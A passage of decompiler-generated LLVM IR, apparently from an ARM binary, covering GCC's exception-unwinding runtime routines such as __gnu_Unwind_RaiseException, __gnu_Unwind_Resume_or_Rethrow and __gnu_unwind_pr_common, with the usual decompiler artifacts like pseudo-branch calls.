  store i32 %v3_17980, i32* %v3_17988, align 4
  %v1_1798c = add i32 %ucbp, 12
  %v2_1798c = inttoptr i32 %v1_1798c to i32*
  %v3_1798c = load i32, i32* %v2_1798c, align 4
  %v2_17990 = icmp eq i32 %v3_1798c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1799c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1799c, i32* @r5, align 4
  br i1 %v2_17990, label %dec_label_pc_179a4, label %dec_label_pc_179e0

dec_label_pc_179a4:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_179b0 = add i32 %ucbp, 16
  %v2_179b0 = inttoptr i32 %v1_179b0 to i32*
  %v3_179b0 = load i32, i32* %v2_179b0, align 4
  call void @__pseudo_branch(i32 %v3_179b0)
  br i1 false, label %dec_label_pc_179d8, label %dec_label_pc_179c4

dec_label_pc_179c4:                               ; preds = %dec_label_pc_179a4
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_c2b4.266 to i32))
  %v0_179cc = load i32, i32* @r4, align 4
  %v0_179d0 = load i32, i32* @r5, align 4
  store i32 %v0_179d0, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_179cc, i32 %v0_179d0)
  br label %dec_label_pc_179d8

dec_label_pc_179d8:                               ; preds = %dec_label_pc_179a4, %dec_label_pc_179c4
  %v0_179d8 = load i32, i32* @r5, align 4
  %v1_179d8 = add i32 %v0_179d8, 4
  %v1_179dc = inttoptr i32 %v1_179d8 to i32*
  %v2_179dc = call i32 @__restore_core_regs(i32* %v1_179dc)
  %v1_179e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_179e0

dec_label_pc_179e0:                               ; preds = %entry, %dec_label_pc_179d8
  %v1_179e4 = phi i32 [ %v0_1799c, %entry ], [ %v1_179e4.pre, %dec_label_pc_179d8 ]
  %v3_179e4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_179e4, i32 1)
  %v0_179e8 = call i32 @abort()
  ret i32 %v0_179e8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 6, 5, 10, 4, 3, 9, 8, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 74, 75, 76, 77, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 5, 6, 8, 9, 10, 11, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 45, 37, 0, 46, 47, 48, 49, 66, 67, 68, 39, 78, 42, 80, 62, 59, 60, 61, 55, 56, 57, 63, 44, 58, 38, 64, 65, 50, 51, 52, 53, 54, 43, 85, 89, 88, 87, 81, 82, 1, 40, 69, 70, 71, 83, 84, 86, 72, 73, 41, 79, 2, 3, 4 }
  uselistorder i1 true, { 0, 3, 4, 5, 6, 7, 1, 136, 2, 117, 8, 9, 10, 11, 12, 13, 109, 110, 118, 119, 111, 14, 15, 16, 112, 113, 114, 120, 17, 18, 19, 137, 138, 139, 140, 141, 20, 142, 143, 21, 132, 24, 25, 26, 27, 22, 23, 133, 28, 134, 29, 30, 31, 32, 33, 34, 35, 107, 36, 37, 38, 39, 108, 42, 41, 40, 145, 146, 147, 148, 149, 150, 151, 115, 152, 153, 154, 124, 155, 156, 157, 158, 116, 159, 160, 161, 162, 163, 164, 165, 43, 166, 144, 167, 44, 45, 46, 47, 48, 49, 121, 168, 50, 169, 170, 171, 172, 51, 97, 125, 173, 52, 96, 174, 53, 95, 175, 176, 177, 178, 54, 179, 126, 55, 99, 180, 56, 98, 181, 182, 57, 183, 184, 185, 58, 186, 187, 59, 188, 60, 128, 189, 190, 127, 191, 192, 61, 100, 62, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 64, 102, 65, 203, 204, 205, 66, 101, 206, 67, 63, 207, 208, 68, 209, 210, 211, 69, 212, 213, 214, 215, 216, 70, 71, 129, 72, 73, 74, 75, 135, 103, 217, 123, 218, 122, 76, 104, 105, 219, 131, 220, 221, 78, 222, 223, 79, 106, 225, 77, 226, 224, 227, 130, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_179e0, { 1, 0 }
  uselistorder label %dec_label_pc_179d8, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_179ec = load i32, i32* @r4, align 4
  store i32 %v3_179ec, i32* %stack_var_-16, align 4
  %v6_179ec = load i32, i32* @r5, align 4
  %v9_179ec = load i32, i32* @r6, align 4
  %v12_179ec = load i32, i32* @lr, align 4
  %v1_179f0 = add i32 %entry_vrs, 60
  %v2_179f0 = inttoptr i32 %v1_179f0 to i32*
  %v3_179f0 = load i32, i32* %v2_179f0, align 4
  %v2_179f4 = add i32 %entry_vrs, 64
  %v3_179f4 = inttoptr i32 %v2_179f4 to i32*
  store i32 %v3_179f0, i32* %v3_179f4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_17a24 = load i32, i32* %v3_179f4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_17a3c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17a24)
  %v2_17a40 = icmp eq i32 %v2_17a3c, 0
  br i1 %v2_17a40, label %dec_label_pc_17a48, label %dec_label_pc_17a7c

dec_label_pc_17a48:                               ; preds = %entry
  %v0_17a48 = load i32, i32* @r5, align 4
  %v1_17a50 = add i32 %v0_17a48, 16
  %v2_17a50 = inttoptr i32 %v1_17a50 to i32*
  %v3_17a50 = load i32, i32* %v2_17a50, align 4
  call void @__pseudo_branch(i32 %v3_17a50)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17a68 = load i32, i32* %saved_vrs_-320, align 4
  %v1_17a6c = urem i32 %v2_17a68, 2
  %v2_17a6c = icmp eq i32 %v1_17a6c, 0
  br i1 %v2_17a6c, label %dec_label_pc_17a8c, label %dec_label_pc_17a74

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a48, %dec_label_pc_17a8c
  %v0_17a74 = phi i1 [ false, %dec_label_pc_17a48 ], [ %phitmp, %dec_label_pc_17a8c ]
  br i1 %v0_17a74, label %dec_label_pc_17a98, label %dec_label_pc_17a7c

dec_label_pc_17a7c:                               ; preds = %entry, %dec_label_pc_17a74
  %v2_17a84 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17a84, i32* @r4, align 4
  store i32 %v6_179ec, i32* @r5, align 4
  store i32 %v9_179ec, i32* @r6, align 4
  store i32 %v12_179ec, i32* @lr, align 4
  ret i32 9

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_17a48
  %v2_17a8c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_17a8c, i32* @r0, align 4
  %v1_17a90 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_17a8c)
  %v0_17a74.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_17a74.pre, 6
  br label %dec_label_pc_17a74

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a74
  %v0_17a98 = load i32, i32* @r5, align 4
  %v0_17a9c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_17a98, i32 %v0_17a9c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17a7c, { 1, 0 }
  uselistorder label %dec_label_pc_17a74, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_17aa4 = add i32 %ucbp, 12
  %v2_17aa4 = inttoptr i32 %v1_17aa4 to i32*
  %v3_17aa4 = load i32, i32* %v2_17aa4, align 4
  %v2_17aa8 = icmp eq i32 %v3_17aa4, 0
  br i1 %v2_17aa8, label %dec_label_pc_17ab0, label %dec_label_pc_17ab4

dec_label_pc_17ab0:                               ; preds = %entry
  %v2_17ab0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_17ab4

dec_label_pc_17ab4:                               ; preds = %entry, %dec_label_pc_17ab0
  %v1_17ab4 = add i32 %entry_vrs, 60
  %v2_17ab4 = inttoptr i32 %v1_17ab4 to i32*
  %v3_17ab4 = load i32, i32* %v2_17ab4, align 4
  %v2_17abc = add i32 %entry_vrs, 64
  %v3_17abc = inttoptr i32 %v2_17abc to i32*
  store i32 %v3_17ab4, i32* %v3_17abc, align 4
  %v3_17ac0 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_17ac0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_17ab4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_17b20

bb:                                               ; preds = %entry
  %v7_17ad8 = mul i32 %regclass, 4
  %v8_17ad8 = add i32 %v7_17ad8, ptrtoint (i32* @global_var_17ae0.608 to i32)
  call void @__pseudo_branch(i32 %v8_17ad8)
  br label %dec_label_pc_17b20

dec_label_pc_17b20:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_17c08 = load i32, i32* @r4, align 4
  %v6_17c08 = load i32, i32* @r5, align 4
  %v2_17c18 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_17c20 = add i32 %ucbp, 76
  %v2_17c20 = inttoptr i32 %v1_17c20 to i32*
  %v3_17c20 = load i32, i32* %v2_17c20, align 4
  %v1_17c2c = inttoptr i32 %v3_17c20 to i32*
  %v2_17c2c = load i32, i32* %v1_17c2c, align 4
  store i32 %v2_17c2c, i32* @lr, align 4
  %v4_17c2c = add i32 %v3_17c20, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_17c38 = urem i32 %state, 4
  store i32 %v1_17c38, i32* %r2.global-to-local, align 4
  %v1_17c3c = and i32 %state, 8
  store i32 %v1_17c3c, i32* %r0.global-to-local, align 4
  %v4_17c4c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_17c2c, i32* %v4_17c4c, align 8
  br i1 %v2_17c18, label %dec_label_pc_17c5c, label %dec_label_pc_17f38

dec_label_pc_17c5c:                               ; preds = %entry
  %v3_17c5c = mul i32 %v2_17c2c, 256
  store i32 %v3_17c5c, i32* %v4_17c4c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17f38, %dec_label_pc_17c5c
  %v0_17c98647090 = phi i32 [ %v2_17f50, %dec_label_pc_17f38 ], [ %v4_17c2c, %dec_label_pc_17c5c ]
  store i32 %v1_17c38, i32* %r2.global-to-local, align 4
  %v1_17c78 = add i32 %ucbp, 80
  %v2_17c78 = inttoptr i32 %v1_17c78 to i32*
  %v3_17c78 = load i32, i32* %v2_17c78, align 4
  %v7_17c7c = icmp eq i32 %v1_17c38, 2
  br i1 %v7_17c7c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_17c74
  %v2_17c80 = add i32 %ucbp, 56
  %v3_17c80 = inttoptr i32 %v2_17c80 to i32*
  %v4_17c80 = load i32, i32* %v3_17c80, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17c74, %bb
  %v0_17c986470 = phi i32 [ %v0_17c98647090, %dec_label_pc_17c74 ], [ %v4_17c80, %bb ]
  %v1_17c84 = urem i32 %v3_17c78, 2
  %v2_17c84 = icmp eq i32 %v1_17c84, 0
  br i1 %v2_17c84, label %dec_label_pc_17c98.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_17d58

dec_label_pc_17c98.preheader:                     ; preds = %bb148
  %v1_17c986571 = inttoptr i32 %v0_17c986470 to i32*
  %v2_17c986672 = load i32, i32* %v1_17c986571, align 4
  %v2_17c9c6874 = icmp eq i32 %v2_17c986672, 0
  br i1 %v2_17c9c6874, label %dec_label_pc_17d58, label %dec_label_pc_17ca4.preheader.lr.ph.lr.ph

dec_label_pc_17ca4.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_17c98.preheader
  %v7_17ca8 = icmp eq i32 %id, 2
  %v2_17d34 = icmp eq i32 %v1_17c38, 0
  %v2_17f00 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_17e1c = icmp eq i32 %v1_17c3c, 0
  br label %dec_label_pc_17ca4.preheader.lr.ph

dec_label_pc_17ca4.preheader.lr.ph:               ; preds = %dec_label_pc_17ca4.preheader.lr.ph.lr.ph, %dec_label_pc_17f6c
  %v1_17cb496 = phi i32 [ %v2_17c986672, %dec_label_pc_17ca4.preheader.lr.ph.lr.ph ], [ %v2_17c9866, %dec_label_pc_17f6c ]
  %v1_17cb093 = phi i32 [ %v0_17c986470, %dec_label_pc_17ca4.preheader.lr.ph.lr.ph ], [ %v2_17f70, %dec_label_pc_17f6c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_17ca4.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_17f6c ]
  br label %dec_label_pc_17ca4.preheader

dec_label_pc_17ca4.preheader:                     ; preds = %dec_label_pc_17ca4.preheader.lr.ph, %dec_label_pc_17f30
  %v1_17cb495 = phi i32 [ %v1_17cb496, %dec_label_pc_17ca4.preheader.lr.ph ], [ %v2_17c98, %dec_label_pc_17f30 ]
  %v1_17cb092 = phi i32 [ %v1_17cb093, %dec_label_pc_17ca4.preheader.lr.ph ], [ %v1_17f30, %dec_label_pc_17f30 ]
  br label %dec_label_pc_17ca4

dec_label_pc_17ca4:                               ; preds = %dec_label_pc_17ca4.preheader, %dec_label_pc_17d48
  %v1_17cb4 = phi i32 [ %v1_17cb495, %dec_label_pc_17ca4.preheader ], [ %v2_17d4c, %dec_label_pc_17d48 ]
  %v1_17cc8 = phi i32 [ %v1_17cb092, %dec_label_pc_17ca4.preheader ], [ %v1_17d48, %dec_label_pc_17d48 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_17ca8, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_17ca4
  %v2_17cac = add i32 %v1_17cc8, 4
  %v3_17cac = inttoptr i32 %v2_17cac to i32*
  %v4_17cac = load i32, i32* %v3_17cac, align 4
  store i32 %v4_17cac, i32* @r5, align 4
  store i32 %v1_17cb4, i32* @r6, align 4
  %v0_17cb8109 = load i32, i32* @r8, align 4
  %v1_17cb8110 = add i32 %v0_17cb8109, 72
  %v2_17cb8111 = inttoptr i32 %v1_17cb8110 to i32*
  %v3_17cb8112 = load i32, i32* %v2_17cb8111, align 4
  store i32 %v3_17cb8112, i32* @lr, align 4
  %v2_17cc4 = add i32 %v1_17cc8, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_17ca4
  %v2_17cb0 = add i32 %v1_17cc8, 2
  %v3_17cb0 = inttoptr i32 %v2_17cb0 to i16*
  %v4_17cb0 = load i16, i16* %v3_17cb0, align 2
  %v5_17cb0 = zext i16 %v4_17cb0 to i32
  store i32 %v5_17cb0, i32* @r5, align 4
  %v0_17cb8 = load i32, i32* @r8, align 4
  %v1_17cb8 = add i32 %v0_17cb8, 72
  %v2_17cb8 = inttoptr i32 %v1_17cb8 to i32*
  %v3_17cb8 = load i32, i32* %v2_17cb8, align 4
  store i32 %v3_17cb8, i32* @lr, align 4
  %v2_17cc0 = inttoptr i32 %v1_17cc8 to i16*
  %v3_17cc0 = load i16, i16* %v2_17cc0, align 2
  %v4_17cc0 = zext i16 %v3_17cc0 to i32
  store i32 %v4_17cc0, i32* @r6, align 4
  %v2_17cc8 = add i32 %v1_17cc8, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_17cc8, %.thread16 ], [ %v2_17cc4, %bb151 ]
  %v3_17cb8115 = phi i32 [ %v3_17cb8, %.thread16 ], [ %v3_17cb8112, %bb151 ]
  %v0_17cd0113 = phi i32 [ %v5_17cb0, %.thread16 ], [ %v4_17cac, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_17cd0 = and i32 %v0_17cd0113, -2
  %v2_17cd4 = add i32 %v1_17cd0, %v3_17cb8115
  store i32 %v2_17cd4, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_17ce4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17ce4, i32* %r0.global-to-local, align 4
  %v5_17cf0 = call i32 @_Unwind_VRS_Get(i32 %v0_17ce4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17cf0, i32* %r0.global-to-local, align 4
  %v3_17cf4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_17cf4, i32* %r2.global-to-local, align 4
  %v0_17cf8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_17cf8, %v3_17cf4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_17d04

._crit_edge:                                      ; preds = %bb152
  %v0_17d1c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_17d04:                               ; preds = %bb152
  %v0_17d04 = load i32, i32* @r6, align 4
  %v1_17d04 = and i32 %v0_17d04, -2
  %v2_17d08 = add i32 %v1_17d04, %v0_17cf8
  %v3_17d0c = icmp ult i32 %v3_17cf4, %v2_17d08
  br i1 %v3_17d0c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_17d04
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_17d04
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_17d1c = phi i32 [ %v0_17d1c.pre, %._crit_edge ], [ %v0_17d04, %bb153 ], [ %v0_17d04, %.thread20 ]
  %v0_17ec4 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_17d18 = load i32, i32* @r5, align 4
  %v1_17d1c = urem i32 %v0_17d1c, 2
  %v1_17d18 = mul i32 %v0_17d18, 2
  %v3_17d20 = and i32 %v1_17d18, 2
  %v4_17d20 = or i32 %v3_17d20, %v1_17d1c
  store i32 %v4_17d20, i32* %r2.global-to-local, align 4
  %v7_17d24 = icmp eq i32 %v4_17d20, 1
  br i1 %v7_17d24, label %dec_label_pc_17eb8, label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %bb154
  %v2_17d24 = icmp eq i32 %v4_17d20, 0
  br i1 %v2_17d24, label %dec_label_pc_17d30, label %dec_label_pc_17de0

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17d2c
  store i32 %v1_17c38, i32* %r2.global-to-local, align 4
  br i1 %v2_17d34, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_17d30
  %v0_17d48119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_17d48

bb155:                                            ; preds = %dec_label_pc_17d30
  %v2_17d40 = icmp eq i32 %v0_17ec4, 0
  %v0_17d48 = load i32, i32* @r7, align 4
  br i1 %v2_17d40, label %dec_label_pc_17d48, label %dec_label_pc_180c0

dec_label_pc_17d48:                               ; preds = %.thread, %bb155
  %v0_17d48120 = phi i32 [ %v0_17d48119, %.thread ], [ %v0_17d48, %bb155 ]
  %v1_17d48 = add i32 %v0_17d48120, 4
  %v1_17d4c = inttoptr i32 %v1_17d48 to i32*
  %v2_17d4c = load i32, i32* %v1_17d4c, align 4
  %v2_17d50 = icmp eq i32 %v2_17d4c, 0
  br i1 %v2_17d50, label %dec_label_pc_17d58, label %dec_label_pc_17ca4

dec_label_pc_17d58:                               ; preds = %dec_label_pc_17f6c, %dec_label_pc_17f30, %dec_label_pc_17d48, %dec_label_pc_17c98.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_17c98.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17d48 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17f30 ], [ %stack_var_-76.4, %dec_label_pc_17f6c ]
  %v0_17d58 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17d58, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_17d60 = call i32 @__gnu_unwind_execute(i32 %v0_17d58, %anon_struct_13* %tmp156)
  store i32 %v4_17d60, i32* %r0.global-to-local, align 4
  store i32 %v4_17d60, i32* %r5.global-to-local, align 4
  %v2_17d64 = icmp eq i32 %v4_17d60, 0
  br i1 %v2_17d64, label %dec_label_pc_17d6c, label %dec_label_pc_17de8

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d58
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_17d70 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_17d70, label %bb157, label %dec_label_pc_17d7c

bb157:                                            ; preds = %dec_label_pc_17d6c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17dec

dec_label_pc_17d7c:                               ; preds = %dec_label_pc_17d6c
  %v2_17d7c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_17d7c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_17d8c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17d8c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_17d94 = call i32 @_Unwind_VRS_Get(i32 %v0_17d8c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_17d98 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_17d8c, i32* %r0.global-to-local, align 4
  %v5_17dac = call i32 @_Unwind_VRS_Set(i32 %v0_17d8c, i32 %v0_17d98, i32 14, i32 %v0_17d98, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17dac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v4_17db8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 36) to i32*), align 4
  %v0_17dbc = load i32, i32* %r5.global-to-local, align 4
  %v0_17dc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17dc0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_17db8, i32* %stack_var_-48, align 4
  %v5_17dd4 = call i32 @_Unwind_VRS_Set(i32 %v0_17dc0, i32 %v0_17dbc, i32 15, i32 %v0_17dbc, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17dec

dec_label_pc_17de0:                               ; preds = %dec_label_pc_17d2c
  %v7_17de0 = icmp eq i32 %v4_17d20, 2
  br i1 %v7_17de0, label %dec_label_pc_17df8, label %dec_label_pc_17de8

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17de0, %dec_label_pc_17ecc, %dec_label_pc_17d58, %dec_label_pc_180c0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17dec

dec_label_pc_17dec:                               ; preds = %bb157, %dec_label_pc_180f8, %dec_label_pc_18088, %bb166, %dec_label_pc_17d7c, %dec_label_pc_17de8
  %v1_17df4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_180f8 ], [ %v1_17df4.pre, %dec_label_pc_18088 ], [ 7, %bb166 ], [ 7, %dec_label_pc_17d7c ], [ 9, %dec_label_pc_17de8 ]
  store i32 %v3_17c08, i32* %r4.global-to-local, align 4
  store i32 %v6_17c08, i32* %r5.global-to-local, align 4
  ret i32 %v1_17df4

dec_label_pc_17df8:                               ; preds = %dec_label_pc_17de0
  store i32 %v1_17c38, i32* %r2.global-to-local, align 4
  %v0_17dfc = load i32, i32* @r7, align 4
  %v1_17dfc = inttoptr i32 %v0_17dfc to i32*
  %v2_17dfc = load i32, i32* %v1_17dfc, align 4
  %tmp206 = bitcast i32 %v2_17dfc to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_17e04 = bitcast float %tmp207 to i32
  store i32 %v1_17e04, i32* @sl, align 4
  br i1 %v2_17d34, label %dec_label_pc_17e0c, label %dec_label_pc_17f78

dec_label_pc_17e0c:                               ; preds = %dec_label_pc_17df8
  %v2_17e0c = icmp eq i32 %v0_17ec4, 0
  br i1 %v2_17e0c, label %dec_label_pc_17f60, label %dec_label_pc_17e14

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17e0c
  %v2_17e18 = icmp eq i32 %v1_17e04, 0
  br i1 %v2_17e18, label %dec_label_pc_17e24.thread, label %bb159

dec_label_pc_17e24.thread:                        ; preds = %dec_label_pc_17e14
  br label %dec_label_pc_18088

bb159:                                            ; preds = %dec_label_pc_17e14
  br i1 %v3_17e1c, label %dec_label_pc_17e2c, label %dec_label_pc_17f60

dec_label_pc_17e2c:                               ; preds = %bb159
  %v1_17e2c = add i32 %v0_17dfc, 4
  store i32 %v1_17e2c, i32* @r6, align 4
  store i32 108, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_17e3c = load i32, i32* @r8, align 4
  %v1_17e3c = add i32 %v0_17e3c, 88
  store i32 %v1_17e3c, i32* %sb.global-to-local, align 4
  store i32 %v1_17e2c, i32* @r4, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e50:                               ; preds = %bb161
  %v1_17e50 = add i32 %v0_17e50, 1
  store i32 %v1_17e50, i32* @r5, align 4
  %v1_17e54 = load i32, i32* @sl, align 4
  %v9_17e54 = icmp eq i32 %v1_17e50, %v1_17e54
  %v0_17e58 = load i32, i32* @r4, align 4
  %v1_17e58 = add i32 %v0_17e58, 4
  store i32 %v1_17e58, i32* @r4, align 4
  br i1 %v9_17e54, label %dec_label_pc_18088, label %dec_label_pc_17e50.dec_label_pc_17e60_crit_edge

dec_label_pc_17e50.dec_label_pc_17e60_crit_edge:  ; preds = %dec_label_pc_17e50
  %v0_17e6c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e60:                               ; preds = %dec_label_pc_17e50.dec_label_pc_17e60_crit_edge, %dec_label_pc_17e2c
  %v0_17e6c = phi i32 [ %v0_17e6c.pre, %dec_label_pc_17e50.dec_label_pc_17e60_crit_edge ], [ %v1_17e3c, %dec_label_pc_17e2c ]
  %v1_17e70 = phi i32 [ %v1_17e58, %dec_label_pc_17e50.dec_label_pc_17e60_crit_edge ], [ %v1_17e2c, %dec_label_pc_17e2c ]
  %v1_17e60 = inttoptr i32 %v1_17e70 to i32*
  %v2_17e60 = load i32, i32* %v1_17e60, align 4
  %v2_17e64 = icmp eq i32 %v2_17e60, 0
  store i32 %v0_17e6c, i32* %forced_unwind_-44, align 4
  br i1 %v2_17e64, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_17e60
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_17e60, %bb160
  %v0_17e74 = load i32, i32* @r8, align 4
  store i32 %v0_17e74, i32* %r0.global-to-local, align 4
  store i32 %v2_17f00, i32* %r2.global-to-local, align 4
  %v4_17e84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 108) to i32*), align 4
  store i32 97936, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17e84)
  %v0_17e90 = load i32, i32* %r0.global-to-local, align 4
  %v2_17e90 = icmp eq i32 %v0_17e90, 0
  %v0_17e50 = load i32, i32* @r5, align 4
  br i1 %v2_17e90, label %dec_label_pc_17e50, label %dec_label_pc_17e98

dec_label_pc_17e98:                               ; preds = %bb161
  %v1_17e98 = load i32, i32* @sl, align 4
  %v9_17e98 = icmp eq i32 %v0_17e50, %v1_17e98
  br i1 %v9_17e98, label %dec_label_pc_18088, label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e98
  %v0_17ea0 = load i32, i32* @r7, align 4
  %v1_17ea0 = inttoptr i32 %v0_17ea0 to i32*
  %v2_17ea0 = load i32, i32* %v1_17ea0, align 4
  %v1_17ea4 = icmp slt i32 %v2_17ea0, 0
  %v0_17eac.pre = load i32, i32* @r6, align 4
